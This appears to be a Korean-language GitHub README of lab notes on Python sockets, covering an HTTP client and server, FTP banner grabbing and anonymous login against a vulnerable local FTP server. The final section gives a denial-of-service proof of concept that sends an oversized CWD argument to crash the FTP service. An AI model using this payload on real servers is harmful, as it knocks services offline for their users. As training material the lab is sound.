# FTP-HTTP-Server-Attacks

# 소켓 클라이언트 구현 및 접속
```python
import socket 
s = socket.socket() # 생략하면 TCP 통신
s.connect(("142.251.42.206", 80)) # nslookup google.com

s.send(b"GET / HTTP/1.1\\r\\nhost: google.com\\r\\n\\r\\n") # 네트워크 통신을 위해 바이트 코드로 구성

data = s.recv(1024) print(data.decode()) s.close()

```
```python
s = socket.socket()
address = ("0.0.0.0", 8080)
# 0.0.0.0 모든 IP 요청을 받겠다는 의미
# 127.0.0.1로 입력하면 127.0.0.1로 접속한 요청만 받겠다는 의미

s.bind(address)
s.listen() # 서비스 시작

conn, addr = s.accept() # 외부에서 들어오는 connect를 수락
# conn은 클라이언트와 직접 소통하는 또다른 소켓
# addr은 클라이언트의 정보
conn.recv(1024) # GET 요청을 받고

data = b'''\
HTTP/1.1 200 OK
Server: Python
Content-Type: text/html;

<html>
<h1>Hello HTTP</h1>
</html>

'''


conn.send(data) # 응답을 보낸다.
s.close()
```
## 취약한 FTP 설치 및 접속
```python
import socket 
s = socket.socket()

addr = ("127.0.0.1", 21)

s.connect(addr)

data = s.recv(1024)

print(data.decode()) # 배너 출력 s.close()
```

![image](https://user-images.githubusercontent.com/93520535/199989427-42ec7d64-7df9-4f39-9359-b951163afe68.png)

```python
import socket

s = socket.socket()
addr = ("127.0.0.1", 21)
s.connect(addr)
data = s.recv(1024)
print("banner:", data.decode()) # 배너 출력

# 로그인 
s.send(b"USER anonymous")
data = s.recv(1024)
print(data.decode())

s.send(b"PASS anonymous")
data = s.recv(1024)
print(data.decode()) # 로그인 성공!

s.close()
```
## Dos attack
```python
import socket

s = socket.socket()
addr = ("127.0.0.1", 21)
s.connect(addr)
data = s.recv(1024)
print("banner:", data.decode()) # 배너 출력

# 로그인 
s.send(b"USER anonymous")
data = s.recv(1024)
print(data.decode())

s.send(b"PASS anonymous")
data = s.recv(1024)
print(data.decode()) # 로그인 성공!

s.send(b"CWD " + b"A" * 10000)
data = s.recv(1024)
print(data.decode()) # dos공격

s.close()
```








